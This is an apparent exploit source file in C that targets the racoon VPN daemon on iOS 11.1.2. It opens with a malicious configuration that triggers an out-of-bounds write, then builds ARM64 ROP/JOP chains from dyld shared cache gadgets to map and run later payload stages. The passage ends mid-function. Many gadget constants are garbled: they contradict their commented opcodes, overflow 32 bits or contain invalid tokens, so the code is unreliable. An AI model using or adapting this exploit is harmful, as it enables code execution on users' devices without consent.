/* racoon iPhone7 11.1.2

struct localconf *lcconf; // "failed to allocate local conf."
__common:00000001000670E0 lcconf          % 8

... setdefault()
retry_counter: lcconf->0x10c
retry_interval: lcconf->0x110

struct isakmp_cfg_config isakmp_cfg_config; // "No more than %d DNS"
__common:0000000100067C18 dns4            % 0xC
__common:0000000100067C24 dns4_index      % 4
__common:0000000100067C28 wins4           % 0x10
__common:0000000100067C38 nbns4_index     % 4

mode_cfg {
    wins4 1.2.3.4;		# nbns4[0]
    wins4 1.2.3.4;		# nbns4[1]
    wins4 1.2.3.4;		# nbns4[2]
    wins4 1.2.3.4;		# nbns4[3]
    wins4 255.255.255.255;	# nbns4[4] {wins4_index} = -1
    wins4 50.253.255.255;	# nbns4[-1] {dns4_index} = (0x1000670E0 - 0x100067C18) / 4 = -718, {wins4_index} = 0
    dns4 65.66.67.68;		# dns[0] {lcconf.lo} = 0x45464748
    dns4 69.70.71.72;		# dns[0] {lcconf.hi} = 0x41424344
}
timer {
    counter 1094795585;			# lcconf->retry_counter {0x4142434445464748 + 0x10c} = 0x41414141
    interval 1094795585 sec;		# lcconf->retry_interval {0x4142434445464748 + 0x110} = 0x41414141
    #persend 1094795585;		# lcconf->count_persend {0x4142434445464748 + 0x114} = 0x41414141
    #phase1 1094795585 sec;		# lcconf->retry_checkph1 {0x4142434445464748 + 0x118} = 0x41414141
    #phase2 1094795585 sec;		# lcconf->wait_ph2complete {0x4142434445464748 + 0x11c} = 0x41414141
    #natt_keepalive 1094795585 sec;	# lcconf->natt_ka_interval {0x4142434445464748 + 0x120} = 0x41414141
}
mode_cfg {
    banner "aaaaaaaa";	# trigger strlcpy -> _platform_memmove by lazy binding (or 'default_domain')
}

*/

#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach-o/loader.h>

#include "config.h"
#include "config.bin"
#include "ac.c"
#include "patchfinder64.c"

//#define BREAKPOINT_0
//#define BREAKPOINT_1

//#define FORCE_ALT_PIVOT 1
//#define FORCE_BAD_CHAIN 1

#define SHARED_REGION_BASE_ARM64 0x180000000
#define SHARED_REGION_SIZE_ARM64 0x40000000

struct dyld_cache_header {
    char magic[16];                     /* e.g. "dyld_v0     ppc" */
    uint32_t mappingOffset;             /* file offset to first dyld_cache_mapping_info */
    uint32_t mappingCount;              /* number of dyld_cache_mapping_info entries */
    uint32_t imagesOffset;              /* file offset to first dyld_cache_image_info */
    uint32_t imagesCount;               /* number of dyld_cache_image_info entries */
    uint64_t dyldBaseAddress;           /* base address of dyld when cache was built */
    uint64_t codeSignatureOffset;       /* file offset in of code signature blob */
    uint64_t codeSignatureSize;         /* size of code signature blob (zero means to end of file) */
};

struct dyld_cache_mapping_info {
    uint64_t address;
    uint64_t size;
    uint64_t fileOffset;
    uint32_t maxProt;
    uint32_t initProt;
};

struct dyld_cache_image_info {
    uint64_t address;
    uint64_t modTime;
    uint64_t inode;
    uint32_t pathFileOffset;
    uint32_t pad;
};

static uint64_t
read_uleb128(const uint8_t **q, const uint8_t *end)
{
    const uint8_t *p = *q;
    uint64_t result = 0;
    int bit = 0;
    do {
        uint64_t slice;

        if (p == end) {
            errx(1, "malformed uleb128 extends beyond trie");
        }

        slice = *p & 0x7f;

        if (bit >= 64 || slice << bit >> bit != slice) {
            errx(1, "uleb128 too big for 64-bits");
        } else {
            result |= (slice << bit);
            bit += 7;
        }
    } while (*p++ & 0x80);
    *q = p;
    return result;
}

static void
processExportNode(const uint8_t *const start, const uint8_t *p, const uint8_t* const end, char *cummulativeString, int curStrOffset, uint64_t *loc, const char *sym)
{
    if (p >= end) {
        errx(1, "malformed trie, node past end");
    }
    const uint8_t terminalSize = read_uleb128(&p, end);
    const uint8_t *children = p + terminalSize;
    if (terminalSize != 0) {
        /*uintptr_t nodeOffset = p - start;*/
        const char *name = strdup(cummulativeString);
        uint64_t address;
        uint64_t flags = read_uleb128(&p, end);
        uint64_t other;
        const char *importName;

        if (flags & EXPORT_SYMBOL_FLAGS_REEXPORT) {
            address = 0;
            other = read_uleb128(&p, end);
            importName = (char*)p;
//printf("[%s] -> [%s]%d\n", name, importName, other);
        } else {
            address = read_uleb128(&p, end); 
            if (!strcmp(sym, name)) {
                *loc = address;
            }
            if (flags & EXPORT_SYMBOL_FLAGS_STUB_AND_RESOLVER) {
                other = read_uleb128(&p, end);
            } else {
                other = 0;
            }
            importName = NULL;
        }
        /*printf("%llx: %s\n", address, name);*/
        free((char *)name);
    }

    const uint8_t childrenCount = *children++;
    const uint8_t *s = children;
    uint8_t i;
    for (i = 0; i < childrenCount; ++i) {
        int edgeStrLen = 0;
        while (*s != '\0') {
            cummulativeString[curStrOffset + edgeStrLen] = *s++;
            ++edgeStrLen;
        }
        cummulativeString[curStrOffset + edgeStrLen] = *s++;
        uint32_t childNodeOffset = read_uleb128(&s, end);
        if (childNodeOffset == 0) {
            errx(1, "malformed trie, childNodeOffset==0");
        }
        processExportNode(start, start + childNodeOffset, end, cummulativeString, curStrOffset + edgeStrLen, loc, sym);
    }
}

static void
do_export(const unsigned char *p, off_t sz, uint32_t export_off, uint32_t export_size, uint64_t *loc, const char *sym)
{
    const unsigned char *q = p + export_off;
    const unsigned char *end = q + export_size;
    char *cummulativeString;
    if (q == end) {
        return;
    }
    cummulativeString = malloc(end - q);
    if (!cummulativeString) {
        errx(1, "out of memory");
    }
    processExportNode(q, q, end, cummulativeString, 0, loc, sym);
    free(cummulativeString);
}

static uint64_t
macho_sym(const uint8_t *p, uint64_t sz, const uint8_t *bp, const char *sym)
{
    uint32_t i;
    const struct mach_header *hdr = (struct mach_header *)p;
    const uint8_t *q;
    uint64_t base = 0;
    uint64_t loc = 0;

    assert(MACHO(p) && IS64(p));

    q = (const uint8_t *)(hdr + 1) + 4;
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (struct segment_command_64 *)q;
            if (!strcmp(seg->segname, "__TEXT")) {
                base = seg->vmaddr;
                break;
            }
        }
        q = q + cmd->cmdsize;
    }

    q = (const uint8_t *)(hdr + 1) + 4;
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_DYLD_INFO_ONLY) {
            const struct dyld_info_command *dic = (struct dyld_info_command *)q;
            do_export(bp, sz, dic->export_off, dic->export_size, &loc, sym);
        }
        q = q + cmd->cmdsize;
    }
    if (!loc) {
        return 0;
    }

    return base + loc;
}

static uint64_t
macho_stub(const uint8_t *p, uint64_t sz, const uint8_t *bp, const struct dyld_cache_mapping_info *map, uint64_t fun)
{
    uint32_t i;
    const struct mach_header *hdr = (struct mach_header *)p;
    const uint8_t *q;
    uint64_t loc = 0;

    assert(MACHO(p) && IS64(p));

    if (!fun) {
        return 0;
    }

    q = (const uint8_t *)(hdr + 1) + 4;
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (struct segment_command_64 *)q;
            if (!strcmp(seg->segname, "__DATA_CONST")) {
                unsigned j;
                const struct section_64 *sec = (struct section_64 *)(seg + 1);
                for (j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__la_symbol_ptr")) {
                        uint64_t *secptr = (uint64_t *)(bp + sec[j].addr - map[1].address + map[1].fileOffset);
                        size_t k, size = sec[j].size / sizeof(uint64_t);
                        for (k = 0; k < size; k++) {
                            // XXX smart relo pointer
                            if ((secptr[k] & 0x1FFFFFFFF) == fun) {
                                loc = sec[j].addr + k * 8;
                                break;
                            }
                        }
                        break;
                    }
                }
            }
        }
        q = q + cmd->cmdsize;
    }

    if (!loc) {
        return 0;
    }

    q = (const uint8_t *)(hdr + 1) + 4;
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (struct segment_command_64 *)q;
            if (!strcmp(seg->segname, "__TEXT")) {
                unsigned j;
                const struct section_64 *sec = (struct section_64 *)(seg + 1);
                for (j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__stubs")) {
                        size_t k, size = sec[j].size / sizeof(uint32_t);
                        uint64_t pos = sec[j].addr - map[0].address + map[0].fileOffset;
                        for (k = 0; k < size; k += 3) {
                            uint64_t start = pos + k * sizeof(uint32_t);
                            uint64_t end = start + 3 * sizeof(uint32_t);
                            addr_t x16 = calc64(bp, start, end, 16);
                            if (x16 && x16 + map[0].address == loc) {
                                return sec[j].addr + k * sizeof(uint32_t);
                            }
                        }
                        break;
                    }
                }
            }
        }
        q = q + cmd->cmdsize;
    }

    return 0;
}

#define countof(x) sizeof(x) / sizeof(*(x))

static struct gadget_t {
    uint64_t addr;
    uint8_t *bytes;
    size_t length;
    uint8_t *bytes2;
    size_t length2;
} gadgets[] = {
    /*
    jop:
    a9400028 ldp x8, x0, [x1]
    d63f0100 blr x8
    alt-jop:
    a94002a8 ldp x8, x0, [x21]
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1ce75e0000, 0x104fl8000 }, 2 * 4,
         (uint8_t *)&(uint32_t []){ 0x103aa000, 0x1cdd28000}, 2 * 4 },
    /*
    pivot:
    9100003f mov sp, x1
    d61f0000 br x0
    alt-pivot: XXX this is functionally different (see gadget_first)
    9100003f mov sp, x1
    910043ff add sp, sp, #0x10
    XXX iOS 12 may have some junk here: d296648d movz x13, #0xb324
    d63f0000 blr x0
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x9100003f, 0xd61f0000 }, 2 * 4,
         (uint8_t *)&(uint32_t []){ 0x9100003f, 0x910043ff, 0xd63f0000 }, 3 * 4 },
    /*
    first:
    a9417bfd ldp x29, x30, [sp, #0x10]
    a8c24ff4 ldp x20, x19, [sp], #0x20
    d65f03c0 ret
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x107d8000, 0x1cedd28000, 0x1ceb2b000 }, 3 * 4, NULL, 0 },
    /*
    nop:
    a8c17bfd ldp x29, x30, [sp], #0x10
    d65f03c0 ret
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xa8c17bfd, 0xd65f03c0 }, 2 * 4, NULL, 0 },
    /*
    retx8:
    f94007e8 ldr x8, [sp, #8]
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xf94007e8, 0xd63f0100 }, 2 * 4, NULL, 0 },
    /*
    loadx0:
    f94003e0 ldr x0, [sp]
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x4z 0xd63f0100 }, 2 * 4, NULL, 0 },
    /*
    loadx1:
    f94003e1 ldr x1, [sp]
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1ceb2b000, 0x109874000 }, 2 * 4, NULL, 0 },
    /*
    loadx2:
    f94003e2 ldr x2, [sp]
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1cddc4000, 0x104f18000 }, 2 * 4, NULL, 0 },
    /*
    loadx3:
    f94003e3 ldr x3, [sp]
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1cdd28000, 0x104f18000}, 2 * 4, NULL, 0 },
    /*
    zerox5:
    d2800005 movz x5, #0
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1cdd28000, 0x1ce75e000}, 2 * 4, NULL, 0 },
    /*
    loadx6:
    f94003e6 ldr x6, [sp]
    d63f0100 blr x8
    alt-loadx6:
    a9400be6 ldp x6, x2, [sp]
    aa1903e4 mov x4, x25
    aa1a03e5 mov x5, x26
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1cddc4000, 0x1cdd28000 }, 2 * 4,
         (uint8_t *)&(uint32_t []){ 0x11cddc4000, 0x1d838f000, 0x1ddf28000, 0x104f18000}, 4 * 4 },
    /*
    adrx0_170:
    9105c3e0 add x0, sp, #0x170
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1d03aa000, 0x1ce0980200 }, 2 * 4, NULL, 0 },
    /*
    adrx0_230:
    9108c3e0 add x0, sp, #0x230
    d63f0100 blr x8
    alt-adrx0_230
    9108c3e0 add x0, sp, #0x230
    910803e1 add x1, sp, #0x200
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1cdd8000, 0x1d548a000 }, 2 * 4,
         (uint8_t *)&(uint32_t []){ 0xceb2b0100, 0x1fa951000, 0x1e098000 }, 3 * 4 },
    /*
    mov_x1_x0:
    aa0003e1 mov x1, x0
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xaa0003e1, 0x1ce951000 }, 2 * 4, NULL, 0 },
    /*
    mov_x4_x0:
    aa0003e4 mov x4, x0
    aa1303e0 mov x0, x19
    d63f0100 blr x8
    alt-mov_x4_x0:
    aa0003e4 mov x4, x0
    aa1403e0 mov x0, x20
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1d6aef000, 0x1cdd28000, 0x1fa0980000 }, 3 * 4,
         (uint8_t *)&(uint32_t []){ 0xd6aeaef000, 0xaa1403e0, 0x1098744000 }, 3 * 4 },
    /*
    call6:
    a8c17bfd ldp x29, x30, [sp], #0x10
    d61f00c0 br x6
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xa8c17bfd, 0xd61f00c0 }, 2 * 4, NULL, 0 },
    /*
    str_x0_x1:
    f9000020 str x0, [x1]
    a8c17bfd ldp x29, x30, [sp], #0x10
    d65f03c0 ret
    */
   { 0, (uint8_t *)&(uint32_t []){ 0x1cddc4000, 0x1ffa951000, 0x1ceb2b000, NULL, 0 },
    /*
    set_sp:
    910003bf mov sp, x29
    a8c17bfd ldp x29, x30, [sp], #0x10
    d65f03c0 ret
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x1cdb8d000, 0xa8c17bfd, 0x1cdb8000 }, 3 * 4, NULL, 0 },
    /*
    neg_x0:
    aa2003e0 mvn x0, x0
    a8c17bfd ldp x29, x30, [sp], #0x10
    d65f03c0 ret
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x000000000000012, 0x0000001ce0ad7b8, 0x001ffel00000000 }, 3 * 4, NULL, 0 },
#if 1 // these are used inside stage2 to gain initial code execution inside remote process
    /*
    pivot_from_10:
    f9404940 ldr x0, [x10, #0x90]
    f9400008 ldr x8, [x0]
    f9406508 ldr x8, [x8, #0xc8]
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xf9404940, 0xf9400008, 0xf9406508, 0xd63f0100 }, 4 * 4, NULL, 0 },
    /*
    jmp_4args:
    a9420408 ldp x8, x1, [x0, #0x20]
    a9430c02 ldp x2, x3, [x0, #0x30]
    f9400904 ldr x4, [x8, #0x10]
    aa0803e0 mov x0, x8
    d61f0080 br x4
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xa9420408, 0xa9430c02, 0xf9400904, 0xaa0803e0, 0xd61f0080 }, 5 * 4, NULL, 0 },
    /*
    lea_x0_jmp_x8:
    f9400108 ldr x8, [x8]
    910023e0 add x0, sp, #8
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xf9400108, 0x910023e0, 0xd63f0100 }, 3 * 4, NULL, 0 },
#endif
#if 1 // these are used inside stage3 to map stage4
    /*
    adrx0_d0:
    910343e0 add x0, sp, #0xd0
    d63f0100 blr x8
    */
    { 0, (uint8_t *)&(uint32_t []){ 0x0000000207411a00, 0x1cdb8d000 }, 2 * 4, NULL, 0 },
#endif
    /*
    jop2:
    a9400422 ldp x2, x1, [x1]
    d61f0040 br x2
    */
    { 0, (uint8_t *)&(uint32_t []){ 0xa9400422, 0xd61f0040 }, 2 * 4, NULL, 0 },
};

static AC_STRUCT *
ac_init(void)
{
    int rv;
    size_t i, na = countof(gadgets);
    AC_STRUCT *node = ac_alloc();
    if (!node) {
        return NULL;
    }
    for (i = 0; i < na; i++) {
        rv = ac_add_string(node, (char *)gadgets[i].bytes, gadgets[i].length, i + 1);
        if (!rv) {
            ac_free(node);
            return NULL;
        }
    }
    rv = ac_prep(node);
    if (!rv) {
        fprintf(stderr, "!ac_prep\n");
        ac_free(node);
        return NULL;
    }
    return node;
}

static int
search_gadgets(const uint8_t *p, size_t sz)
{
    const uint8_t *q = p;
    size_t i, j = 0, n = countof(gadgets);
    if (n > 1) {
        AC_STRUCT *ac = ac_init();
        if (ac) {
            ac_search_init(ac, (char *)p, sz);
            while (n > 1) {
                int id = 0;
                int length = 0;
                char *found = ac_search(ac, &length, &id);
                if (!found) {
                    break;
                }
                if (!gadgets[id - 1].addr) {
                    printf("ac found gadget[%d] 0x%zx, size=%d\n", id - 1, found - (char *)p, length);
                    gadgets[id - 1].addr = found - (char *)p;
                    n--;
                }
                q = (uint8_t *)found;
            }
            ac_free(ac);
        }
    }
    for (i = 0; i < countof(gadgets); i++) {
        if (!gadgets[i].addr) {
            uint8_t *found = boyermoore_horspool_memmem(q, p + sz - q, gadgets[i].bytes, gadgets[i].length);
            if (!found) {
                fprintf(stderr, "gadget %zu missing\n", i);
                j++;
            } else {
                gadgets[i].addr = found - p;
                printf("bm found gadget[%zu] 0x%llx, size=%zu\n", i, gadgets[i].addr, gadgets[i].length);
            }
        }
    }
    return j;
}

#define r(x) do { /*printf("*%p = %s\n", (void *)rstrip, #x);*/ *rstrip++ = (unsigned long)(x); } while (0)

#define retx8() \
    do { \
        r(0); \
        r(gadget_retx8); \
        r(0); \
        r(gadget_nop); \
    } while (0)

#define map2(addr, size, cache, addr2, size2, stage2, slide) \
    do { \
        retx8(); \
        r(0); \
        r(gadget_loadx6); \
        r(symbol_open + slide); \
        r(gadget_adrx0_230); \
            strcpy((char *)rstrip + 0x230, cache); \
        r(0); \
        r(gadget_loadx1); \
        r(0); \
        r(gadget_call6); \
        retx8(); \
        r(0); \
        r(gadget_loadx6); \
        r(symbol_mmap + slide); \
        r(gadget_mov_x4_x0); \
        r(0); \
        r(gadget_loadx0); \
        r(addr); \
        r(gadget_loadx1); \
        r(size); \
        r(gadget_loadx2); \
        r(PROT_READ | PROT_EXEC); \
        r(gadget_loadx3); \
        r(MAP_FILE | MAP_SHARED | MAP_FIXED); \
        r(gadget_zerox5); \
        r(0); \
        r(gadget_call6); \
        \
        retx8(); \
        r(0); \
        r(gadget_loadx6); \
        r(symbol_open + slide); \
        r(gadget_adrx0_170); \
            strcpy((char *)rstrip + x170, stage2); \
        r(0); \
        r(gadget_loadx1); \
        r(0); \
        r(gadget_call6); \
        retx8(); \
        r(0); \
        r(gadget_loadx6); \
        r(symbol_mmap + slide); \
        r(gadget_mov_x4_x0); \
        r(0); \
        r(gadget_loadx0); \
        r(addr2); \
        r(gadget_loadx1); \
        r(size2); \
        r(gadget_loadx2); \
        r(PROT_READ | PROT_WRITE); \
        r(gadget_loadx3); \
        r(MAP_FILE | MAP_PRIVATE | MAP_FIXED); \
        r(gadget_zerox5); \
        r(0); \
        r(gadget_call6); \
        retx8(); \
        r(0); \
        r(gadget_mov_x1_x0); \
        r(0); \
        r(gadget_loadx0); \
        if (alt_slide) { \
            r(-slide); \
            r(gadget_neg_x0); \
        } else { \
            r(slide); \
            r(gadget_nop); \
        } \
        r(0); \
        r(gadget_str_x0_x1); \
        r(addr2); \
        r(gadget_set_sp); \
    } while (0)

static int
is_bad_addr(uint64_t gadget)
{
    while (gadget) {
        if ((gadget & 0xff) == '\"') {
            return 1;
        }
        gadget >>= 8;
    }
    return 0;
}

static uint64_t
try_ok_addr(const uint8_t *p, uint64_t slide, const struct dyld_cache_mapping_info *map, const struct gadget_t *gadget, int *alt, int *bad)
{
    uint64_t addr = gadget->addr;
    *alt = 0;
    while (is_bad_addr(addr + map->address + slide)) {
        const uint8_t *q;
        q = boyermoore_horspool_memmem(p + addr + 4, map->size - addr - 4, gadget->bytes, gadget->length);
        if (!q) {
#if 666
            if (gadget->bytes2 && gadget->length2) {
                uint64_t addr2 = 0;
                do {
                    q = boyermoore_horspool_memmem(p + addr2 + 4, map->size - addr2 - 4, gadget->bytes2, gadget->length2);
                    if (!q) {
                        addr2 = 0;
                        break;
                    }
                    addr2 = q - p;
                } while (is_bad_addr(addr2 + map->address + slide));
                if (addr2) {
                    *alt = 1;
                    addr = addr2;
                    break;
                }
            }
#endif
            (*bad)++;
            break;
        }
        addr = q - p;
    }
    return addr + map->address + slide;
}

static uint64_t
get_ok_addr(const uint8_t *p, uint64_t slide, const struct dyld_cache_mapping_info *map, const struct gadget_t *gadgets, unsigned i, int *bad)
{
    int alt, worse = 0;
    uint64_t addr = try_ok_addr(p, slide, map, &gadgets[i], &alt, &worse);
    if (worse) {
        fprintf(stderr, "WARNING: (slide = 0x%llx) bad address for gadget %d\n", slide, i);
        (*bad) += worse;
    }
    return addr;
}

static unsigned char *
build_stage1(const uint8_t *p, uint64_t slide, const struct dyld_cache_mapping_info *map, uint64_t sym_open[], uint64_t sym_mmap[], size_t *psz, int *bad)
{
    uint8_t *ptr;
    unsigned char *rstart;
    unsigned long *rstrip;
    const size_t rsz = 4096;
    size_t len = strlen(STAGE2_NAME) + 1;
    const size_t x170 = 0x170;

    int alt, worse = 0;
    uint64_t gadget_pivot = try_ok_addr(p, slide, map, &gadgets[1], &alt, &worse);
    uint64_t gadget_first = get_ok_addr(p, slide, map, gadgets, 2, bad);
    uint64_t gadget_nop = get_ok_addr(p, slide, map, gadgets, 3, bad);
    uint64_t gadget_retx8 = get_ok_addr(p, slide, map, gadgets, 4, bad);
    uint64_t gadget_loadx0 = get_ok_addr(p, slide, map, gadgets, 5, bad);
    uint64_t gadget_loadx1 = get_ok_addr(p, slide, map, gadgets, 6, bad);
    uint64_t gadget_loadx2 = get_ok_addr(p, slide, map, gadgets, 7, bad);
    uint64_t gadget_loadx3 = get_ok_addr(p, slide, map, gadgets, 8, bad);
    uint64_t gadget_zerox5 = get_ok_addr(p, slide, map, gadgets, 9, bad);
    uint64_t gadget_loadx6 = get_ok_addr(p, slide, map, gadgets, 10, bad);
    uint64_t gadget_adrx0_170 = get_ok_addr(p, slide, map, gadgets, 11, bad);
    uint64_t gadget_adrx0_230 = get_ok_addr(p, slide, map, gadgets, 12, bad);
    uint64_t gadget_mov_x1_x0 = get_ok_addr(p, slide, map, gadgets, 13, bad);
    uint64_t gadget_mov_x4_x0 = get_ok_addr(p, slide, map, gadgets, 14, bad);
    uint64_t gadget_call6 = get_ok_addr(p, slide, map, gadgets, 15, bad);
    uint64_t gadget_str_x0_x1 = get_ok_addr(p, slide, map, gadgets, 16, bad);
    uint64_t gadget_set_sp = get_ok_addr(p, slide, map, gadgets, 17, bad);

    uint64_t gadget_neg_x0;
    int alt_slide;

    uint64_t symbol_open;
    uint64_t symbol_mmap;
    unsigned i;

    for (i = 0; sym_open[i] && is_bad_addr(sym_open[i] + slide); i++) {
        continue;
    }
    if (sym_open[i]) {
        symbol_open = sym_open[i];
    } else {
        (*bad)++;
        fprintf(stderr, "WARNING: (slide = 0x%llx) bad address for _open\n", slide);
        symbol_open = sym_open[0];
    }
    for (i = 0; sym_mmap[i] && is_bad_addr(sym_mmap[i] + slide); i++) {
        continue;
    }
    if (sym_mmap[i]) {
        symbol_mmap = sym_mmap[i];
    } else {
        (*bad)++;
        fprintf(stderr, "WARNING: (slide = 0x%llx) bad address for _mmap\n", slide);
        symbol_mmap = sym_mmap[0];
    }

    if (worse) {
        fprintf(stderr, "WARNING: (slide = 0x%llx) bad address for gadget %d\n", slide, 1);
        (*bad)++;
    }
#ifdef FORCE_ALT_PIVOT
    alt = 1;
#endif
    if (alt) {
        gadget_first = gadget_nop;
    }

    alt_slide = is_bad_addr(slide);
    if (alt_slide) {
        worse = 0;
        gadget_neg_x0 = try_ok_addr(p, slide, map, &gadgets[18], &alt, &worse);
        if (worse) {
            (*bad)++;
            alt_slide = 0;
            fprintf(stderr, "WARNING: (slide = 0x%llx) bad slide value\n", slide);
        }
    }
    assert(!alt_slide || !is_bad_addr(-slide));

    rstrip = calloc(1, rsz);
    assert(rstrip);
    rstart = (unsigned char *)rstrip;

    r(gadget_pivot);
    r(gadget_first);
    map2(FAKE_SHARED_CACHE_ADDR, map->size, SHARED_CACHE_NAME, STAGE2_STATIC_ADDRESS, STAGE2_MAX_SIZE, STAGE2_NAME, slide);

    ptr = boyermoore_horspool_memmem(rstart, rsz, (uint8_t *)STAGE2_NAME, len);
    assert(ptr);

    *psz = ptr - rstart + len;

if (0) {
    FILE *eff;
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "stage1-0x%llx", slide);
    eff = fopen(tmp, "wb");
    fwrite(rstart, 1, *psz, eff);
    fclose(eff);
}

    return rstart;
}

#undef r
#define r(x) do { \
    /*printf("*%p = %s\n", (void *)rstrip, #x);*/ \
    if (!strncmp(#x, "symbol_", 7) || !strncmp(#x, "gadget_", 7)) { \
        /*printf("\trel @0x%zx: 0x%zx\n", relptr - relocs, (unsigned char *)rstrip - rstart);*/ \
        *relptr++ = (unsigned char *)rstrip - rstart; \
    } \
    *rstrip++ = (unsigned long)(x); \
} while (0)

#define map4(addr2, size2, stage4) \
    do { \
        retx8(); \
        r(0); \
        r(gadget_loadx6); \
        r(symbol_open); \
        r(gadget_adrx0_d0); \
            strcpy((char *)rstrip + 0xd0, stage4); \
        r(0); \
        r(gadget_loadx1); \
        r(0); \
        r(gadget_call6); \
        retx8(); \
        r(0); \
        r(gadget_loadx6); \
        r(symbol_mmap); \
        r(gadget_mov_x4_x0); \
        r(0); \
        r(gadget_loadx0); \
        r(addr2); \
        r(gadget_loadx1); \
        r(size2); \
        r(gadget_loadx2); \
        r(PROT_READ | PROT_WRITE); \
        r(gadget_loadx3); \
        r(MAP_FILE | MAP_PRIVATE | MAP_FIXED); \
        r(gadget_zerox5); \
        r(0); \
        r(gadget_call6); \
        r(addr2); \
        r(gadget_set_sp); \
    } while (0)

static unsigned char *
build_stage3(uint64_t address, uint64_t symbol_open, uint64_t symbol_mmap, size_t *psz, size_t *usz)
{
    uint8_t *ptr;
    unsigned char *rstart;
    unsigned long *rstrip;
    unsigned long *relocs;
    unsigned long *relptr;
    const size_t rsz = 4096;
    size_t i, len = strlen(STAGE4_NAME) + 1;

    uint64_t gadget_nop = address + gadgets[3].addr;
    uint64_t gadget_retx8 = address + gadgets[4].addr;
    uint64_t gadget_loadx0 = address + gadgets[5].addr;
    uint64_t gadget_loadx1 = address + gadgets[6].addr;
    uint64_t gadget_loadx2 = address + gadgets[7].addr;
    uint64_t gadget_loadx3 = address + gadgets[8].addr;
    uint64_t gadget_zerox5 = address + gadgets[9].addr;
    uint64_t gadget_loadx6 = address + gadgets[10].addr;
    uint64_t gadget_mov_x4_x0 = address + gadgets[14].addr;
    uint64_t gadget_call6 = address + gadgets[15].addr;
    uint64_t gadget_set_sp = address + gadgets[17].addr;
    uint64_t gadget_adrx0_d0 = address + gadgets[22].addr;

    rstrip = calloc(1, rsz);
    assert(rstrip);
    rstart = (unsigned char *)rstrip;

    relocs = calloc(1, rsz);
    assert(relocs);
    relptr = relocs;

    map4(STAGE4_STATIC_ADDRESS, STAGE4_MAX_SIZE, STAGE4_NAME);

    ptr = boyermoore_horspool_memmem(rstart, rsz, (uint8_t *)STAGE4_NAME, len);
    assert(ptr);

    *usz = (ptr - rstart + len + 7) & ~7;
    rstrip = (unsigned long *)(rstart + *usz);

    *rstrip++ = 0;
    for (i = 0; relocs + i < relptr; i++) {
        *rstrip++ = relocs[i];
    }

    free(relocs);

    *psz = (unsigned char *)rstrip - rstart;
    return rstart;
}
#undef r
#undef retx8
#undef map2

#define _i2(x) (unsigned)((x) & 0xFFFFFFFF), (unsigned)(((x) >> 32) & 0xFFFFFFFF)
#define _c4(x) (x) & 0xFF, ((x) >> 8) & 0xFF, ((x) >> 16) & 0xFF, ((x) >> 24) & 0xFF
#define _c8(x) (unsigned)((x) & 0xFF), (unsigned)(((x) >> 8) & 0xFF), (unsigned)(((x) >> 16) & 0xFF), (unsigned)(((x) >> 24) & 0xFF), (unsigned)(((x) >> 32) & 0xFF), (unsigned)(((x) >> 40) & 0xFF), (unsigned)(((x) >> 48) & 0xFF), (unsigned)(((x) >> 56) & 0xFF)

static int
really(const uint8_t *p, off_t sz, uint64_t masterSlide)
{
    int rv;
    FILE *f;
    unsigned i;
    size_t rsz, usz;
    unsigned char *rstrip;
    const struct dyld_cache_header *hdr = (struct dyld_cache_header *)p;
    const struct dyld_cache_mapping_info *map = (struct dyld_cache_mapping_info *)(p + hdr->mappingOffset);
    const struct dyld_cache_image_info *img = (struct dyld_cache_image_info *)(p + hdr->imagesOffset);
    uint64_t memmove_lazy = 0;
    uint64_t memmove_func = 0;
    uint64_t sym_open[256];
    uint64_t sym_mmap[256];
    unsigned num_open = 0;
    unsigned num_mmap = 0;
    uint64_t map1_end = (map[1].address + map[1].size + 0x3FFF) & ~0x3FFF;
    int64_t slide, loSlide, hiSlide;
    uint64_t maxSlide;
    int dirty = 0;

    assert(hdr->mappingCount == 3 && map[0].address == SHARED_REGION_BASE_ARM64 && map[0].size < (uint64_t)sz);

    memset(sym_open, 0, sizeof(sym_open));
    memset(sym_mmap, 0, sizeof(sym_mmap));

    for (i = 0; i < hdr->imagesCount; i++) {
        uint64_t address = img[i].address;
        const char *imgName = (const char *)p + img[i].pathFileOffset;
        address = address - map[0].address + map[0].fileOffset;
        if (!strcmp(imgName, "/usr/lib/system/libsystem_c.dylib")) {
            addr_t call, stub;
